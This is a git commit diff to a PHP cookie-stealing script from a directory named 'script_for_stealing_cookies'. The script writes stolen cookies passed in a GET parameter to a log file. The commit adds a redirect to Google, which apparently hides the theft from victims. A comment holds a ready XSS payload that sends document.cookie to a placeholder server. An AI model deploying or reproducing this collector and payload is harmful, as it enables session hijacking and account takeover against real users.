8c48eedb4f1987680759caa8b762d30ee0c23342
Ahmed Yousri <eng.yosri@yahoo.com>
2018-04-16 21:52:41 +0300

    Cookies update

--- script_for_stealing_cookies/cookiegrab.php
+++ script_for_stealing_cookies/cookiegrab.php
@@ -3,6 +3,7 @@
 	$cookie = $_GET['c'];
 	$file = fopen('cookielog.txt', 'a');
 	fwrite($file, $cookie . "\n\n");
+    header("Location: https://www.google.com");
 	/* 
 	inject 
 	<script> document.location= "http://Server_name/cookiegrab.php?c=" + document.cookie; </script>
